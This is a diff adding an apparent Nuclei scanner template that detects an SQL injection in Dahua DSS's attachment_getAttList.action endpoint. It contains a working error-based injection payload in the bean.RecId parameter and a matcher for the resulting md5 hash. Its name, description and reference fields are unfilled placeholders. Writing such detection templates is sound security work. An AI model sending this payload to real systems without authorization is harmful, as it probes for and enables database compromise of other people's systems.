@@ -1,0 +1,19 @@
+id: dahua-DSS-getAttList-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(md5(1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b'
